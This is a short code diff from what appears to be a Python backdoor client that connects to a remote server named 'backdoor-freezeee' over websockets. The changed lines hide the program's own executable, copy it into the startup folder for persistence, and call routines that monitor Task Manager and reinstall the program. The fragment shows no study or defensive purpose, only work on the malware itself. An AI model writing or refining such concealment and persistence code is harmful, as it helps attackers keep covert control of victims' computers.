@@ -14,7 +14,6 @@ server_url = "wss://backdoor-freezeee.onrender.com"
 
 CLIENT_NAME = socket.gethostname()
 
-
 if getattr(sys, 'frozen', False):
     current_path = sys.executable
 else:
@@ -83,9 +82,9 @@ state = {
 }
 
 if not im_in_startup():
-    hide_file(current_exe)
+    hide_file(sys.executable)
     sleep(3)
-    move_to_startup(current_exe)
+    move_to_startup(sys.executable)
 monitor_taskmgr()
 check_reinstall()
 
